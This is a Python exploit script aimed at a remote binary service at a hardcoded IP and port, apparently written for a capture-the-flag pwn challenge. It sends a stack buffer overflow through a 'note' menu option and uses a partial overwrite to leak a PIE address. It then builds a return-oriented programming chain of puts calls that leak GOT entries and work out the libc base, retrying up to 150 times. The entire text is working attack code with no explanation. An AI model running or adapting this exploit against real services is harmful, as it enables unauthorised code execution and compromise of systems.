import socket, struct, time
HOST="144.79.188.39"; PORT=44942
INIT=0x3d40; FRAME=0x1c10; PLT_PUTS=0x1154; MAIN=0x1240; BSS=0x4220; RET=0x101a; POP_RDI=0x145b
STDERR=0x4040; IO_STDERR=0x21b6a0
GOTS=[("setvbuf",0x3fb8),("putc",0x3f98),("memcmp",0x3f80),("syscall",0x3fa0)]
def p64(x): return struct.pack("<Q",x)
def p16(x): return struct.pack("<H",x)
def u64(b): return struct.unpack("<Q",b.ljust(8,b"\x00"))[0]
def recvu(s,d,t=6):
    s.settimeout(t); data=b""
    while d not in data:
        try: c=s.recv(4096)
        except socket.timeout: break
        if not c: break
        data+=c
    return data
def recvall(s,t=2):
    s.settimeout(t); data=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except socket.timeout: pass
    return data
def audit(s,p):
    s.sendall(b"5\n"); recvu(s,b"size?\n"); s.sendall(b"65600\n"); recvu(s,b"note?\n"); s.sendall(p)

for a in range(150):
    s=socket.socket(); s.settimeout(12); s.connect((HOST,PORT))
    recvu(s,b"-1) exit\n")
    audit(s, b"A"*0x70+p16(INIT)); time.sleep(0.3)
    out=recvall(s,2); leak=b""
    if b" 4) Probe\n" in out:
        rest=out.split(b" 4) Probe\n",1)[1]
        leak=rest.split(b"-1) exit",1)[0] if b"-1) exit" in rest else rest
    if len(leak)<6: s.close(); continue
    pie=u64(leak[:6])-FRAME
    if pie & 0xfff: s.close(); continue
    chain=[]
    for n,g in GOTS:
        chain += [p64(pie+POP_RDI), p64(pie+g), p64(pie+PLT_PUTS)]
    chain += [p64(pie+POP_RDI), p64(pie+STDERR), p64(pie+PLT_PUTS), p64(pie+MAIN)]
    s1=b"A"*0x68+p64(pie+BSS)+p64(0)+p64(pie+RET)+b"".join(chain)
    audit(s,s1); time.sleep(0.5)
    out=recvall(s,3); s.close()
    addrs=[]
    for ln in out.split(b"\n"):
        if len(ln)>=6:
            x=u64(ln[:6])
            if 0x700000000000 <= x <= 0x800000000000: addrs.append(x)
    if len(addrs)<len(GOTS)+1:
        print(f"[{a}] pie={hex(pie)} got {len(addrs)}"); continue
    base=addrs[-1]-IO_STDERR
    print(f"[{a}] base={hex(base)}")
    for (n,g),x in zip(GOTS, addrs):
        print(f"  {n:10s} off={hex(x-base)}")
    break
